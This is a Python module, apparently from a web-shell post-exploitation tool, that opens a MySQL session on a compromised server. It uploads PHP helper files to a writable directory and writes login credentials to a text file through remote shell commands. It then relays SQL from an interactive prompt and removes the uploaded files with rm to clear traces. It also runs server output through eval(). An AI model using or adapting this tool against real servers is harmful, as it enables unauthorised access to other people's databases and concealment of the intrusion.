from core.libs.shell_handler import linux
from core.libs.file_handler import file_handler
from core.libs.request_handler import make_request
from core.libs.thirdparty.termcolor import cprint
from tablize import Tablize


class MySQLConnection:

    def __init__(self, host, username, password):
        cprint("\n[+] Please type 'exit' when your done to remove the files uploaded on the server")
        self.host = host
        self.username = username
        self.password = password
        self.hostDir = linux.get_writble_dir()
        if not self.hostDir:
            cprint("'\n[+] Unable to locate a writeble directory on the server")
            cprint("\n[+]MySQL module can't be used. Exiting now!")
        else:
            self.phpFile = [self.hostDir + "/mysql.php", self.hostDir + "/auth.php"]
            cprint('\n[+] Uploading PHP files...', 'green')
            for i in self.phpFile:
                file_handler.upload_file('modules/services/{0}'.format(i.split('/')[-1]), i)

            cmd = 'echo "%s,%s,%s" > %s/auth.txt' % (self.username, self.password, self.host, self.hostDir)
            cprint('\n[+] Authenticating with the server...', 'blue')
            make_request.get_page_source(cmd)

            cmd = "cd {0}; php {1}".format(self.hostDir, 'auth.php')
            res = make_request.get_page_source(cmd)
            if 'failure' in res:
                cprint("\n[+] Access denied for user '{0}'@'{1}'".format(self.username, self.host), 'red')
                self.authorized = False
                self.clean()
            else:
                cprint("\n[+]Login Successful", 'green')
                self.authorized = True

    def execut(self, sql):
        cmd = 'echo "%s" > %s/sql.txt' % (sql, self.hostDir)
        cprint('\n[+] Sending SQL...', 'green')
        make_request.get_page_source(cmd)
        cmd2 = 'cd %s; php mysql.php' % self.hostDir
        res = make_request.get_page_source(cmd2)
        res = res[0].replace('null', '"null"')
        try:
            res = eval(res)
            d = Tablize(res, sql)
            d.tablize(d.tup)
        except:
            cprint(res, 'red')

    def run(self):
        if self.authorized:
            while True:
                try:
                    sql = raw_input('mysql> ').rstrip()
                    if sql == "exit":
                        self.clean()
                        return
                    if 'use ' in sql:
                        self.db = sql.split('use ')[-1].split()[0]

                    try:
                        self.execut("use {0}; {1};".format(self.db, sql))
                    except:
                        self.execut(sql)
                except KeyboardInterrupt:
                    self.clean()
                    break

    def clean(self):
        cmd = "rm {0}/auth.*; rm {0}/mysql.php; rm {0}/sql.txt".format(self.hostDir)
        cprint("\n[+] Removing uploaded files...", 'blue')
        make_request.get_page_source(cmd)

    @staticmethod
    def help():
        cprint("\n[+] Type: @mysql [-hhost] -uusername* [-ppassword]", 'blue')
        cprint("[+] Example: @mysql -uroot -p123456", 'white')
        cprint("[+] Example: @mysql -h192.168.1.3 -uroot", "white")
